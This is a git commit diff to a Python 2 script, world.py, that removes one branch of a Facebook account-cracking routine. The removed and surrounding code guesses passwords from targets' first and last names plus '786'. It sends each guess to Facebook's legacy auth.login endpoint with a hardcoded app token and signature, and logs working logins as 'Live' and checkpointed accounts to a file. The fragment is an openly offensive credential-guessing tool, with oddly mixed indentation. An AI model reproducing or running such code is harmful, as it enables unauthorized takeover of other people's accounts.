70116dca76613f2095d26fd8dfff9bd7f24917eb
Dark Vikrant <60290718+darkvikrant@users.noreply.github.com>
2020-05-12 00:04:01 +0530

    Add files via upload

--- world.py
+++ world.py
@@ -2320,20 +2320,6 @@ def pilih_super():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																else:
-																	pass8 = l['first_name'] + '786'
-																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-																	e = json.load(data)
-																	if 'access_token' in e:
-																		print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass8
-																		oks.append(user+pass8)
-																	else:
-                                    if 'www.facebook.com' in e["error_msg"]:
-                                      print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass8
-                                      cek = open("out/checkpoint.txt", "a")
-                                      cek.write(user+"|"+pass8+"\n")
-                                      cek.close()
-                                      cekpoint.append(user+pass8)
-																	else:
 																		pass9 = l['last_name'] + '786'
 																		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																		e = json.load(data)
